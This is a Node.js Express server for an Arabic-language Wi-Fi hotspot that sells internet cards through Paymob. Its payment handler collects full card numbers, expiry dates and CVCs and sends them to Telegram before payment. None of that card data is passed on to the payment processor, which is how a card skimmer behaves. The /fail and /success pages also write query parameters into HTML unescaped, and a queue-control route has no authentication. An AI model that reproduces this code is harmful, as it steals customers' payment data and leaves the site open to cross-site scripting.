const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
require("dotenv").config();

const { processPayment } = require("./pay");
const { sendTelegramMessage } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");

const app = express();
const PORT = process.env.MIKROTIK_PORT || process.env.PORT || 9595;

// رابط صفحة تسجيل دخول الهوتسبوت أو صفحة الشبكة الرئيسية
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://172.16.0.5";

// 1. تفعيل الميدلوير والـ CORS ومجلد الملفات الثابتة (public)
app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// 2. الصفحة الرئيسية (تخدم تلقائياً public/index.html)
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 3. مسار معالجة الدفع الموحد (يدعم GET و POST بسلاسة مع حماية ضد الانهيار)
async function handlePaymentRequest(req, res) {
  try {
    // تجميع البيانات سواء قادمة من GET (Query) أو POST (Body)
    const data = { ...req.query, ...req.body };
    const { phone, amount, payment_method, method, number, name, expiry, cvc, save_card } = data;

    // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية
    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "wallet";
    const userPhone = phone || "غير محدد";
    const payAmount = amount || "5";

    // تجميع بيانات الكارت الحساسة إن وجدت في الطلب
    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      card_data: {
        number: number || "غير مدخل",
        name: name || "غير مدخل",
        expiry: expiry || "غير مدخل",
        cvc: cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      }
    };

    // إرسال إشعار فوري إلى تليجرام بالبيانات المدخلة قبل التوجيه لـ Paymob
    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, true);
    }

    // معالجة الدفع عبر Paymob (محافظ وبطاقات)
    const result = await processPayment(userPhone, payAmount, selectedMethod);

    if (result.type === "redirect") {
      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
        return res.json({ payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة الدفع:", err.response?.data || err.message);
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

// 4. مسار استقبال طلب السرعة العالية وتعطيل الكيوز من المايكروتك
app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username } = req.body;
    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username);
      return res.json(result);
    }
    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    console.error("❌ خطأ في تنفيذ أمر السيرفر الرئيسي:", err.message);
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

// 5. مسار تنزيل صورة الكارت المصممة بدقة عالية
app.get("/download-card", (req, res) => {
  const transactionId = req.query.id;
  const cardData = global.generatedCardsMap ? global.generatedCardsMap.get(transactionId?.toString()) : null;

  if (cardData && cardData.buffer) {
    res.setHeader("Content-Type", "image/png");
    res.setHeader("Content-Disposition", `attachment; filename="Hikayat_Card_${cardData.code}.png"`);
    return res.send(cardData.buffer);
  } else {
    return res.status(404).send("الصورة غير متوفرة أو انتهت صلاحية الرابط.");
  }
});

// 6. صفحة نجاح الدفع المنسقة احترافياً (تعرض الكارت وتتيح تنزيل الصورة)
app.get("/success", (req, res) => {
  const transactionId = req.query.id || "غير متوفر";
  const cardData = global.generatedCardsMap ? global.generatedCardsMap.get(transactionId.toString()) : null;

  let cardHTML = "";
  if (cardData) {
    cardHTML = `
      <div style="margin: 20px 0; background: #f8f9fa; padding: 20px; border-radius: 12px; border: 2px dashed #27ae60;">
        <span style="font-size: 14px; color: #7f8c8d; font-weight: bold;">كارت النت الخاص بك (شبكة حكايات):</span>
        <div style="font-size: 30px; font-weight: bold; color: #27ae60; letter-spacing: 3px; margin: 12px 0; font-family: monospace;">${cardData.code}</div>
        <p style="font-size: 13px; color: #555; margin-bottom: 15px;">باقة: <strong>${cardData.packageName}</strong></p>
        <a href="/download-card?id=${transactionId}" class="btn-download">📥 تحميل صورة الكارت الاحترافية</a>
      </div>
    `;
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تم الدفع بنجاح - شبكة حكايات</title>
        <style>
          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 30px 15px; direction: rtl; }
          .card { background: white; max-width: 450px; margin: auto; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
          .icon { font-size: 50px; color: #27ae60; margin-bottom: 10px; }
          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 8px; }
          p { color: #555; font-size: 14px; line-height: 1.6; }
          .btn-download { display: inline-block; background: #2980b9; color: white; padding: 12px 20px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 14px; margin-top: 5px; }
          .btn-download:hover { background: #3498db; }
          .btn-home { display: inline-block; background: #27ae60; color: white; padding: 14px 28px; text-decoration: none; border-radius: 6px; margin-top: 20px; font-weight: bold; font-size: 16px; width: 80%; }
          .btn-home:hover { background: #2ecc71; }
        </style>
      </head>
      <body>
        <div class="card">
          <div class="icon">✅</div>
          <h1>تم الدفع وتفعيل الخدمة بنجاح</h1>
          <p>شكراً لاستخدامك خدمة شبكة حكايات.</p>
          <p>رقم العملية: <strong>${transactionId}</strong></p>

          ${cardHTML}

          <a href="${NETWORK_URL}" class="btn-home">الذهاب لتصفح الإنترنت</a>
        </div>
      </body>
    </html>
  `);
});

// 7. صفحة فشل الدفع المنسقة
app.get("/fail", (req, res) => {
  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>فشل الدفع - شبكة حكايات</title>
        <style>
          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 40px 20px; direction: rtl; }
          .card { background: white; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
          .icon { font-size: 50px; color: #e74c3c; margin-bottom: 10px; }
          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
          p { color: #555; font-size: 15px; line-height: 1.6; }
          .error-box { background: #fff3f3; color: #e74c3c; border: 1px dashed #e74c3c; padding: 10px; border-radius: 6px; margin: 15px 0; font-size: 14px; }
          .btn { display: inline-block; background: #e74c3c; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin-top: 15px; font-weight: bold; }
        </style>
      </head>
      <body>
        <div class="card">
          <div class="icon">❌</div>
          <h1>فشل عملية الدفع</h1>
          <div class="error-box">${errorMessage}</div>
          <a href="/" class="btn">إعادة المحاولة</a>
        </div>
      </body>
    </html>
  `);
});

// 8. ربط الـ Webhook الخاص بـ Paymob
app.use("/", webhookRouter);

// 9. تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
